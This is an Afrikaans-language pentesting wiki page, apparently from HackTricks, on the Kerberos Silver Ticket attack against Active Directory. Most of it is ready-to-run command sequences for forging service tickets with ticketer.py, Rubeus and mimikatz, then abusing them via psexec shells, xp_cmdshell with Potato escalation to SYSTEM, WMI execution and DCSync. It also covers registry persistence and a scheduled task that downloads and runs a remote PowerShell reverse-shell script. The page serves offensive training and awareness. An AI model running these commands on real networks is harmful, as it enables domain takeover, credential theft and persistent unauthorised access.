# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Die **Silver Ticket** aanval behels die uitbuiting van service tickets in Active Directory (AD)-omgewings. Hierdie metode berus op die verkryging van die NTLM hash van 'n service account, soos 'n computer account, om 'n Ticket Granting Service (TGS) ticket te vervals. Met hierdie vervalste ticket kan 'n aanvaller toegang kry tot spesifieke dienste op die netwerk, impersonating any user, tipies met die doel om administratiewe voorregte te verkry. Dit word beklemtoon dat die gebruik van AES keys vir die vervalsing van tickets veiliger en minder opspoorbaar is.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.  
> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

For ticket crafting, different tools are employed based on the operating system:

### Op Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Op Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer se lêerstelsel te kry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir take en WMI-navrae.

### Voorbeeld: MSSQL-diens (MSSQLSvc) + Potato na SYSTEM

As jy die NTLM-hash (of AES-sleutel) van 'n SQL-diensrekening (bv. sqlsvc) het, kan jy 'n TGS vir die MSSQL SPN vervals en enigiemand aan die SQL-diens voorgee. Van daar af, aktiveer xp_cmdshell om opdragte uit te voer as die SQL-diensrekening. As daardie token SeImpersonatePrivilege het, ketting 'n Potato om na SYSTEM te verhoog.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- As die resulterende konteks SeImpersonatePrivilege het (dikwels waar vir diensrekeninge), gebruik 'n Potato variant om SYSTEM te kry:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Meer besonderhede oor die misbruik van MSSQL en die aanskakeling van xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato-tegnieke oorsig:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Beskikbare Dienste

| Diens Tipe                                 | Diens Silver Tickets                                                        |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Met **Rubeus** kan jy vir al hierdie tickets vra met die parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Gebeurtenis-ID's

- 4624: Rekening-aanmelding
- 4634: Rekening-afmelding
- 4672: Beheerders-aanmelding

## Persistensie

Om te voorkom dat masjiene hul wagwoord elke 30 dae roteer stel `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` of jy kan `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` op 'n groter waarde as 30 dae stel om die rotasieperiode aan te dui wanneer die masjien se wagwoord geroteer moet word.

## Misbruik van Service tickets

In die volgende voorbeelde gaan ons aanvaar dat die ticket bekom is deur die administrateurrekening te imiteer.

### CIFS

Met hierdie ticket sal jy toegang hê tot die `C$` en `ADMIN$` gids via **SMB** (as dit blootgestel is) en kan lêers kopieer na 'n gedeelte van die afgeleë lêerstelsel deur net iets soos die volgende te doen:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Jy sal ook in staat wees om 'n shell binne die gasheer te verkry of arbitrêre opdragte uit te voer met **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### GASHEER

Met hierdie toestemming kan jy geskeduleerde take op afgeleë rekenaars skep en arbitrêre opdragte uitvoer:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Met hierdie tickets kan jy **WMI in die slagofferstelsel uitvoer**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Vind **meer inligting oor wmiexec** op die volgende bladsy:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Met winrm-toegang tot 'n rekenaar kan jy daarop **toegang kry** en selfs 'n PowerShell kry:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Kyk na die volgende bladsy om **meer maniere te leer om met 'n afgeleë gasheer via winrm te verbind**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Let daarop dat **winrm aktief en aan die luister moet wees** op die afgeleë rekenaar om toegang daartoe te kry.

### LDAP

Met hierdie voorreg kan jy die DC-databasis dump met **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Leer meer oor DCSync** in die volgende bladsy:


{{#ref}}
dcsync.md
{{#endref}}


## Verwysings

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
